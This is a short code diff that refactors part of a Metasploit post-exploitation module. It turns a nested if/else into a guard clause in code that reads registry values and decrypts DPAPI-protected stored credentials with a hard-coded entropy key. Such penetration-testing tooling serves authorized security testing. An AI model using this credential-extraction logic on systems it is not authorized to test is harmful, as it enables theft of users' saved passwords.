@@ -199,14 +199,12 @@ class MetasploitModule < Msf::Post
         vals.each do |val|
           data = registry_getvaldata(reg_path, val)
           if is_system?
-            if !data.starts_with?("{\x00c\x00a\x00p\x00i\x00}\x00 \x001\x00,")
-              next
-            else
-              # this means data was encrypted by elevated user using LocalSystem scope and fixed
-              # pOptionalEntropy value, adjusting parameters
-              data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')
-              entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')
-            end
+            next unless data.starts_with?("{\x00c\x00a\x00p\x00i\x00}\x00 \x001\x00,")
+
+            # this means data was encrypted by elevated user using LocalSystem scope and fixed
+            # pOptionalEntropy value, adjusting parameters
+            data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')
+            entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')
           else
             # convert IVE index to DPAPI pOptionalEntropy value like PSC does
             entropy = get_entropy_from_ive_index(ive_index).encode('UTF-16LE').bytes.pack("c*")
